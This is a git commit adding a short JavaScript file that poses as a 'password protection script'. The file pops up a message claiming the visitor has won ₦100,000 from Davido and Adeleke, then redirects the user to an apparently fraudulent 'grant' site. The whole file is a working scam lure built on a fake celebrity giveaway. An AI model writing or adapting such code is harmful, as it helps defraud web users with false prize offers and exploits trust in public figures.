d0c363184585b2240b983f8559bb23de6d9cb0c4
The-ongoing <preciousadaowo4@gmail.com>
2026-08-17 02:32:55 +0100

    Create activedavido.js

---
+++ activedavido.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦100,000'
+password = prompt(
+  'Congratulations! You are eligible to receive ₦100,000 APPRECIATION SUPPORT FROM DAVIDO & ADELEKE IN CELEBRATION THE VICTORY. Please press OK to receive it instantly.',
+  'WITHDRAW ₦100,000'
+);
+if (password != 'WITHDRAW ₦100,000') {
+  location.href = 'https://ongoing-grant.cfd/100,000-Appreciation-Davido-Adele-Our-Win.html';
+  }
